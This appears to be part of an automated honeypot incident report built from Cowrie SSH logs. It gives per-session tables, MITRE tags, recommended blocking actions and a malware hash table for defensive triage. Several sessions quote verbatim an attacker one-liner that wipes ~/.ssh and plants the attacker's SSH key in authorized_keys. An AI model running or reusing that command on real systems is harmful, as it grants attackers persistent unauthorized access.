- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5a2b583886

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:05 |
| **Last Seen** | 2026-05-02 13:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:05:33` | `cowrie.session.connect` |
| `2026-05-02 13:05:33` | `cowrie.client.version` |
| `2026-05-02 13:05:33` | `cowrie.client.kex` |
| `2026-05-02 13:05:33` | `cowrie.login.success` |
| `2026-05-02 13:05:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-906211efe0a3

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:06 |
| **Last Seen** | 2026-05-02 13:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:06:26` | `cowrie.session.connect` |
| `2026-05-02 13:06:27` | `cowrie.client.version` |
| `2026-05-02 13:06:27` | `cowrie.client.kex` |
| `2026-05-02 13:06:28` | `cowrie.login.success` |
| `2026-05-02 13:06:28` | `cowrie.session.params` |
| `2026-05-02 13:06:28` | `cowrie.command.input` |
| `2026-05-02 13:06:28` | `cowrie.command.failed` |
| `2026-05-02 13:06:28` | `cowrie.log.closed` |
| `2026-05-02 13:06:28` | `cowrie.session.params` |
| `2026-05-02 13:06:28` | `cowrie.command.input` |
| `2026-05-02 13:06:29` | `cowrie.session.file_download` |
| `2026-05-02 13:06:29` | `cowrie.log.closed` |
| `2026-05-02 13:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51a516cc049b

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:06 |
| **Last Seen** | 2026-05-02 13:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:06:31` | `cowrie.session.connect` |
| `2026-05-02 13:06:31` | `cowrie.client.version` |
| `2026-05-02 13:06:31` | `cowrie.client.kex` |
| `2026-05-02 13:06:31` | `cowrie.login.success` |
| `2026-05-02 13:06:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5200843463dc

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:07 |
| **Last Seen** | 2026-05-02 13:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:07:27` | `cowrie.session.connect` |
| `2026-05-02 13:07:27` | `cowrie.client.version` |
| `2026-05-02 13:07:27` | `cowrie.client.kex` |
| `2026-05-02 13:07:28` | `cowrie.login.success` |
| `2026-05-02 13:07:28` | `cowrie.session.params` |
| `2026-05-02 13:07:28` | `cowrie.command.input` |
| `2026-05-02 13:07:28` | `cowrie.command.failed` |
| `2026-05-02 13:07:28` | `cowrie.log.closed` |
| `2026-05-02 13:07:29` | `cowrie.session.params` |
| `2026-05-02 13:07:29` | `cowrie.command.input` |
| `2026-05-02 13:07:29` | `cowrie.session.file_download` |
| `2026-05-02 13:07:29` | `cowrie.log.closed` |
| `2026-05-02 13:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5336c80aa3

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:07 |
| **Last Seen** | 2026-05-02 13:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:07:32` | `cowrie.session.connect` |
| `2026-05-02 13:07:32` | `cowrie.client.version` |
| `2026-05-02 13:07:33` | `cowrie.client.kex` |
| `2026-05-02 13:07:33` | `cowrie.login.success` |
| `2026-05-02 13:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66e6117b61c7

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:11 |
| **Last Seen** | 2026-05-02 13:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:11:05` | `cowrie.session.connect` |
| `2026-05-02 13:11:05` | `cowrie.client.version` |
| `2026-05-02 13:11:05` | `cowrie.client.kex` |
| `2026-05-02 13:11:06` | `cowrie.login.success` |
| `2026-05-02 13:11:06` | `cowrie.session.params` |
| `2026-05-02 13:11:06` | `cowrie.command.input` |
| `2026-05-02 13:11:06` | `cowrie.command.failed` |
| `2026-05-02 13:11:06` | `cowrie.log.closed` |
| `2026-05-02 13:11:06` | `cowrie.session.params` |
| `2026-05-02 13:11:06` | `cowrie.command.input` |
| `2026-05-02 13:11:06` | `cowrie.session.file_download` |
| `2026-05-02 13:11:06` | `cowrie.log.closed` |
| `2026-05-02 13:11:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8521f0e8f1

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:11 |
| **Last Seen** | 2026-05-02 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:11:08` | `cowrie.session.connect` |
| `2026-05-02 13:11:08` | `cowrie.client.version` |
| `2026-05-02 13:11:09` | `cowrie.client.kex` |
| `2026-05-02 13:11:10` | `cowrie.login.success` |
| `2026-05-02 13:11:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abd3eb400629

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:12 |
| **Last Seen** | 2026-05-02 13:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:12:01` | `cowrie.session.connect` |
| `2026-05-02 13:12:01` | `cowrie.client.version` |
| `2026-05-02 13:12:01` | `cowrie.client.kex` |
| `2026-05-02 13:12:01` | `cowrie.login.success` |
| `2026-05-02 13:12:02` | `cowrie.session.params` |
| `2026-05-02 13:12:02` | `cowrie.command.input` |
| `2026-05-02 13:12:02` | `cowrie.command.failed` |
| `2026-05-02 13:12:02` | `cowrie.log.closed` |
| `2026-05-02 13:12:02` | `cowrie.session.params` |
| `2026-05-02 13:12:02` | `cowrie.command.input` |
| `2026-05-02 13:12:02` | `cowrie.session.file_download` |
| `2026-05-02 13:12:02` | `cowrie.log.closed` |
| `2026-05-02 13:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f31ab273e06

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:12 |
| **Last Seen** | 2026-05-02 13:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:12:04` | `cowrie.session.connect` |
| `2026-05-02 13:12:04` | `cowrie.client.version` |
| `2026-05-02 13:12:04` | `cowrie.client.kex` |
| `2026-05-02 13:12:05` | `cowrie.login.success` |
| `2026-05-02 13:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b295bdcf4d0b

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:13 |
| **Last Seen** | 2026-05-02 13:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:13:53` | `cowrie.session.connect` |
| `2026-05-02 13:13:53` | `cowrie.client.version` |
| `2026-05-02 13:13:53` | `cowrie.client.kex` |
| `2026-05-02 13:13:54` | `cowrie.login.success` |
| `2026-05-02 13:13:54` | `cowrie.session.params` |
| `2026-05-02 13:13:54` | `cowrie.command.input` |
| `2026-05-02 13:13:54` | `cowrie.command.failed` |
| `2026-05-02 13:13:54` | `cowrie.log.closed` |
| `2026-05-02 13:13:55` | `cowrie.session.params` |
| `2026-05-02 13:13:55` | `cowrie.command.input` |
| `2026-05-02 13:13:55` | `cowrie.session.file_download` |
| `2026-05-02 13:13:55` | `cowrie.log.closed` |
| `2026-05-02 13:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b81964de6c62

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:13 |
| **Last Seen** | 2026-05-02 13:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:13:57` | `cowrie.session.connect` |
| `2026-05-02 13:13:57` | `cowrie.client.version` |
| `2026-05-02 13:13:57` | `cowrie.client.kex` |
| `2026-05-02 13:13:57` | `cowrie.login.success` |
| `2026-05-02 13:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35914b0b8e2c

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:16 |
| **Last Seen** | 2026-05-02 13:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:16:36` | `cowrie.session.connect` |
| `2026-05-02 13:16:36` | `cowrie.client.version` |
| `2026-05-02 13:16:36` | `cowrie.client.kex` |
| `2026-05-02 13:16:36` | `cowrie.login.success` |
| `2026-05-02 13:16:37` | `cowrie.session.params` |
| `2026-05-02 13:16:37` | `cowrie.command.input` |
| `2026-05-02 13:16:37` | `cowrie.command.failed` |
| `2026-05-02 13:16:37` | `cowrie.log.closed` |
| `2026-05-02 13:16:37` | `cowrie.session.params` |
| `2026-05-02 13:16:37` | `cowrie.command.input` |
| `2026-05-02 13:16:37` | `cowrie.session.file_download` |
| `2026-05-02 13:16:37` | `cowrie.log.closed` |
| `2026-05-02 13:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-967cadd7948d

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:16 |
| **Last Seen** | 2026-05-02 13:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:16:39` | `cowrie.session.connect` |
| `2026-05-02 13:16:39` | `cowrie.client.version` |
| `2026-05-02 13:16:39` | `cowrie.client.kex` |
| `2026-05-02 13:16:40` | `cowrie.login.success` |
| `2026-05-02 13:16:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6f2bbc2f126

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:19 |
| **Last Seen** | 2026-05-02 13:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:19:22` | `cowrie.session.connect` |
| `2026-05-02 13:19:22` | `cowrie.client.version` |
| `2026-05-02 13:19:23` | `cowrie.client.kex` |
| `2026-05-02 13:19:23` | `cowrie.login.success` |
| `2026-05-02 13:19:23` | `cowrie.session.params` |
| `2026-05-02 13:19:23` | `cowrie.command.input` |
| `2026-05-02 13:19:23` | `cowrie.command.failed` |
| `2026-05-02 13:19:23` | `cowrie.log.closed` |
| `2026-05-02 13:19:24` | `cowrie.session.params` |
| `2026-05-02 13:19:24` | `cowrie.command.input` |
| `2026-05-02 13:19:24` | `cowrie.session.file_download` |
| `2026-05-02 13:19:24` | `cowrie.log.closed` |
| `2026-05-02 13:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2865c9f5d72b

| Field | Detail |
|---|---|
| **Source IP** | `152.89.170[.]227` |
| **First Seen** | 2026-05-02 13:19 |
| **Last Seen** | 2026-05-02 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 13:19:26` | `cowrie.session.connect` |
| `2026-05-02 13:19:26` | `cowrie.client.version` |
| `2026-05-02 13:19:26` | `cowrie.client.kex` |
| `2026-05-02 13:19:27` | `cowrie.login.success` |
| `2026-05-02 13:19:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.89.170[.]227` to AbuseIPDB if not already reported
- [ ] Block `152.89.170[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `152.89.170[.]227` | **29** | 2026-05-02 12:35 | 2026-05-02 13:19 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `85.186.121[.]137` | **28** | 2026-05-02 12:34 | 2026-05-02 13:15 | 56m | 0 | `T1592` | 🟠 MEDIUM |
| `20.119.74[.]72` | **2** | 2026-05-02 11:17 | 2026-05-02 11:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-05-02 11:39 | 2026-05-02 11:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.47.238[.]46` | 1 | 2026-05-02 11:27 | 2026-05-02 11:28 | 30s | 0 | `T1592` | 🟢 LOW |
| `52.90.76[.]255` | 1 | 2026-05-02 12:57 | 2026-05-02 12:57 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
